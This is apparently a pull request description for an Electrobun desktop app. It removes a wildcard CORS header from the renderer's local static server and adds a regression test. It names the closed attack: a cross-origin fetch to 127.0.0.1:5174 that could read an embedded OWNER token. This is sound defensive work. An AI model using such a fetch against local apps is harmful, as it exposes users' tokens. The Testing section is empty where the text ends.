# Change

- `packages/app/platforms/electrobun/src/renderer-static.ts`: new
  `buildRendererStaticHtmlHeaders()` / `buildRendererStaticAssetHeaders()`
  builders producing the exact previous headers **without** the wildcard CORS
  grant.
- `packages/app/platforms/electrobun/src/index.ts`: the static server uses
  those builders for the HTML branch and the asset branch (including the
  gzip and 206 range paths, which are unchanged).
- New `renderer-static.test.ts`: regression guard asserting no
  `Access-Control-Allow-Origin` header on HTML, asset, and gzip+range
  variants.

Behavior: renderer responses are no longer readable cross-origin, so the
issue's `fetch("http://127.0.0.1:5174/")` exfiltration fails the browser CORS check for an ordinary cross-origin fetch. The renderer webview loads these responses
same-origin and needs no CORS grant. The proxied `/api/*` branch is
untouched; the agent API's own CORS echoes a validated single origin, never
`*`. The OWNER token is still embedded in same-origin HTML (the app's own
webview needs it); the token-delivery hardening (suggestions 2–3 in the
issue) and the sibling DNS-rebinding issue #33036 are explicitly out of
scope here.

# Testing
